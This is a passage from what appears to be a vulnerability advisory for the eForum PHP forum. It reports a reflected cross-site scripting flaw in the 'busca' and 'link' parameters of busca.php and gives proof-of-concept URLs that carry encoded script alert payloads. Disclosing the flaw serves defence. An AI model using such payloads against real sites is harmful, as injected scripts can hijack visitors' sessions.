2) Security Issues
-------------------


--- [ NON-PERSISTENT XSS ] ---
===============================================

Input passed to "busca" and "link" parameters in busca.php are not properly sanitized before being returned to the 
user's browser.

This can be exploited to execute arbitrary HTML/script code.

--- [ PoC ] ---
===============

http://localhost/eForum/busca.php
use the input box and search what you want. (js)

http://localhost/eForum/busca.php?link=%3Cscript%3Ealert(1)%3C/script%3E&busca=%3Cscript%3Ealert(2)%3C/script%3E

http://localhost/eForum/busca.php?link=%3Cscript%3Ealert(1)%3C/script%3E
